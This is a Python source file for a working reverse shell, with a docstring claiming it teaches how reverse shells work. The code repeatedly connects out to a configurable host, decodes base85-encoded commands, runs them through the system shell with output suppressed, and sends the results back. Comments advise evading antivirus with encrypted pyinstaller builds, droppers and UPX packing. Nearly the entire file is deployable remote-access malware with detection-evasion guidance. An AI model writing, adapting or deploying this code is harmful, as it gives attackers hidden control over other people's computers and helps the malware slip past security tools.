"""
Reverse Shell, This python module may give you a basic understanding of how a reverse shell works

To apply it for your computer:

1.Change HOST to your own IP (you may want to edit PORT, FAMILY and TYPE)
2.Compile it to an executable (you may not need, If your client expects a python file)

Done!

Also because base85 is not an encryption and it is an encoding, A simple firewall rule may block it
I also recommend changing the communication way
"""
# It is used for executing the command
import os
# We need to make stdout silent
import sys
# We need a way to communicate, right ?
import socket
# We use base85 as a way to make our talk a bit more secure (read above)
import base64

HOST = "127.0.0.1"  # Change it to your IP
PORT = 3333  # Change it to an open port on your device
BUFFER = 2048  # Change it if you need more
sock = None  # Don't touch this one

FAMILY, TYPE = socket.AF_INET, socket.SOCK_STREAM  # Change socket.SOCK_STREAM to socket.SOCK_DGRAM for UDP
# For IPv6, Uncomment below and comment above
# FAMILY, TYPE = socket.AF_INET6, socket.SOCK_STREAM

# This module is pretty simple, To avoid AV's you can use encryption in pyinstaller, or use droppers
# Also you may use UPX to compress the original executable to avoid detection
# Don't worry, No docstrings or comments will be on final executable

connected = False
while True:
    try:
        while True:
            while not connected:
                try:
                    sock = socket.socket()
                    if FAMILY == socket.AF_INET6:
                        det = socket.getaddrinfo(HOST, PORT)[1][4:][0]
                    else:
                        det = socket.getaddrinfo(HOST, PORT)[0][4:][0]
                    sock.connect(det)
                    connected = True
                except:
                    connected = False
            while connected:
                try:
                    # Os.popen is a bit loud
                    sys.stdout.write = lambda s: len(s)
                    # 2>&1 makes the shell (no matter windows or linux) write everything it gets on STDERR to STDOUT
                    # We can catch them separately and then append it, But if we do so, We will lose the order of it
                    # But the shell doesn't
                    p = os.popen(base64.b85decode(sock.recv(BUFFER)).decode() + " 2>&1")
                    sock.send(base64.b85encode(p.read().encode()))
                    sock.send(b"")
                except:
                    connected = False
    except:
        # If there was an error in the process, We will continue,
        # We cannot let our reverse_shell run into an exception
        try:
            sock.close()
        except:
            # This closing means, "Retry again"
            pass
